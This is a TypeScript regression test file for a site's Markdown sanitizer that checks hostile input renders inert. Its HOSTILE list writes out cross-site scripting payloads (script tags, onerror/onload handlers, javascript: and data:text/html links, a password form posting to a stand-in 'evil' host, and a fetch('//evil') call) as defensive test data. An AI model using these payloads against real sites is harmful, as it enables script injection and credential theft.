/**
 * Regression tests for the incident Markdown pipeline.
 *
 * The threat model: the Agent Incident Log is a public repo that accepts
 * community pull requests, and its entries render on helio.so. A merged entry
 * must not be able to execute anything — at build time or in a reader's
 * browser. See the header comment in `lib/markdown.ts`.
 *
 * Run with `pnpm test`. No test framework — Node's built-in runner, with native
 * type stripping, so this costs the site zero dependencies.
 */

import { test } from "node:test";
import assert from "node:assert/strict";

import { renderIncidentMarkdown } from "../markdown.ts";

/**
 * Invariants asserted against the output of *every* case below, so a new case
 * cannot be added with weak assertions and quietly pass.
 */
const INVARIANTS: { name: string; pattern: RegExp }[] = [
  { name: "script element", pattern: /<\s*script/i },
  { name: "style element", pattern: /<\s*style/i },
  {
    name: "iframe/object/embed/form/base/meta element",
    pattern: /<\s*(iframe|object|embed|form|base|meta)\b/i,
  },
  { name: "inline event handler", pattern: /\son[a-z]+\s*=/i },
  {
    name: "dangerous URL scheme in an attribute",
    pattern: /(href|src|action|data)\s*=\s*["']?\s*(javascript|vbscript|data:text\/html)/i,
  },
  { name: "style attribute", pattern: /\sstyle\s*=/i },
];

async function render(markdown: string): Promise<string> {
  const html = await renderIncidentMarkdown(markdown);
  for (const invariant of INVARIANTS) {
    assert.ok(
      !invariant.pattern.test(html),
      `output contains a ${invariant.name}: ${html}`,
    );
  }
  return html;
}

/* -------------------------------------------------------------------------- */
/* Hostile input must be neutralised                                          */
/* -------------------------------------------------------------------------- */

const HOSTILE: { name: string; markdown: string; absent: string[] }[] = [
  { name: "script tag", markdown: "Before\n\n<script>alert(1)</script>\n\nAfter", absent: ["alert(1)"] },
  { name: "script nested in a block", markdown: "<div><script>fetch('//evil')</script></div>", absent: ["fetch("] },
  { name: "img onerror", markdown: '<img src=x onerror="alert(1)">', absent: ["onerror", "alert(1)"] },
  { name: "svg onload", markdown: '<svg onload="alert(1)"><circle /></svg>', absent: ["<svg"] },
  { name: "iframe", markdown: '<iframe src="https://evil.example"></iframe>', absent: ["evil.example"] },
  { name: "style element", markdown: "<style>body{display:none}</style>", absent: ["display:none"] },
  { name: "style attribute", markdown: '<p style="position:fixed;top:0">hi</p>', absent: ["position:fixed"] },
  { name: "credential-harvesting form", markdown: '<form action="//evil"><input name="pw" type="password"></form>', absent: ["evil"] },
  { name: "object and embed", markdown: '<object data="//evil"></object><embed src="//evil">', absent: ["evil"] },
  { name: "base tag", markdown: '<base href="//evil/">', absent: ["evil"] },
  { name: "meta refresh", markdown: '<meta http-equiv="refresh" content="0;url=//evil">', absent: ["evil"] },
  { name: "javascript: link", markdown: "[click](javascript:alert(1))", absent: ['href="javascript:'] },
  { name: "javascript: link, mixed case", markdown: "[click](JaVaScRiPt:alert(1))", absent: ['href="jav'] },
  { name: "javascript: link, entity-encoded", markdown: "[click](java&#115;cript:alert(1))", absent: ['href="javascript:'] },
  { name: "data:text/html link", markdown: "[click](data:text/html;base64,PHNjcmlwdD4=)", absent: ["data:text/html"] },
  { name: "vbscript: link", markdown: "[click](vbscript:msgbox(1))", absent: ['href="vbscript:'] },
  { name: "data: image source", markdown: "![x](data:text/html,<script>alert(1)</script>)", absent: ["text/html"] },
  { name: "javascript: autolink", markdown: "<javascript:alert(1)>", absent: ['href="javascript:'] },
  { name: "DOM clobbering via id/name", markdown: '<a id="body" name="location">x</a>', absent: ['id="body"', 'name="location"'] },
];

for (const entry of HOSTILE) {
  test(`neutralises: ${entry.name}`, async () => {
    const html = await render(entry.markdown);
    for (const needle of entry.absent) {
      assert.ok(
        !html.toLowerCase().includes(needle.toLowerCase()),
        `expected ${JSON.stringify(needle)} to be stripped, got: ${html}`,
      );
    }
  });
}

/* -------------------------------------------------------------------------- */
/* MDX-shaped input must be inert, not executed                               */
/* -------------------------------------------------------------------------- */

test("JSX elements do not survive as elements", async () => {
  const html = await render('<Redirect to="//evil" />\n\nprose');
  assert.ok(!html.includes("<Redirect"), html);
  assert.ok(!html.includes("evil"), html);
  assert.match(html, /prose/);
});

test("JSX expressions render as literal text, never evaluated", async () => {
  // Under MDX this would interpolate a build secret. Here it is just characters.
  const html = await render("{process.env.RESEND_API_KEY}");
  assert.match(html, /\{process\.env\.RESEND_API_KEY\}/);
});

test("a bare import statement is inert prose", async () => {
  const html = await render('import fs from "node:fs"\n\nprose');
  assert.match(html, /prose/);
});

test("characters that break MDX parsing render fine as Markdown", async () => {
  // A bare `<`, an unescaped `{` and an autolink each fail MDX compilation.
  // Markdown handles all three, so a merge upstream cannot break this build.
  const html = await render("Costs < 5% and {n} of them. See <https://helio.so>.");
  assert.match(html, /5%/);
  assert.match(html, /\{n\}/);
  assert.match(html, /href="https:\/\/helio\.so"/);
});

/* -------------------------------------------------------------------------- */
/* Legitimate Markdown must still render                                      */
/* -------------------------------------------------------------------------- */

const LEGITIMATE: { name: string; markdown: string; present: string[] }[] = [
  { name: "emphasis and inline code", markdown: "One **bold**, one *em*, one `code`.", present: ["<strong>bold</strong>", "<em>em</em>", "<code>code</code>"] },
  { name: "safe link", markdown: "[Helio](https://helio.so/x)", present: ['href="https://helio.so/x"'] },
  { name: "heading and list", markdown: "## Head\n\n- one\n- two", present: ["<h2>Head</h2>", "<li>one</li>"] },
  { name: "GFM table with alignment", markdown: "| a | b |\n|:--|--:|\n| 1 | 2 |", present: ["<table>", '<th align="left">', '<td align="right">'] },
  { name: "GFM strikethrough", markdown: "~~gone~~", present: ["<del>gone</del>"] },
  { name: "GFM autolink literal", markdown: "See https://helio.so for more.", present: ['href="https://helio.so"'] },
  { name: "fenced code block", markdown: "```ts\nconst x = 1\n```", present: ["<pre>", "<code", "const x = 1"] },
  { name: "blockquote", markdown: "> quoted", present: ["<blockquote>"] },
  { name: "safe image", markdown: "![alt](https://helio.so/a.png)", present: ['src="https://helio.so/a.png"', 'alt="alt"'] },
  { name: "escaped entities", markdown: "5 < 6 & 7 > 6", present: ["&#x3C;", "&#x26;"] },
];

for (const entry of LEGITIMATE) {
  test(`renders: ${entry.name}`, async () => {
    const html = await render(entry.markdown);
    for (const needle of entry.present) {
      assert.ok(html.includes(needle), `expected ${JSON.stringify(needle)} in: ${html}`);
    }
  });
}

test("footnote references resolve to their definitions", async () => {
  // Guards the `clobberPrefix: ""` decision in lib/markdown.ts: leaving the
  // sanitizer's default prefix on would namespace the ids a second time but not
  // the hrefs, breaking every footnote link without breaking the build.
  const html = await render("Claim[^1]\n\n[^1]: Source note.");
  const ids = Array.from(html.matchAll(/id="([^"]+)"/g), (m) => m[1]);
  const hashes = Array.from(html.matchAll(/href="#([^"]+)"/g), (m) => m[1]);
  assert.ok(hashes.length > 0, `expected footnote links in: ${html}`);
  for (const target of hashes) {
    assert.ok(ids.includes(target), `href="#${target}" has no matching id in: ${html}`);
  }
});
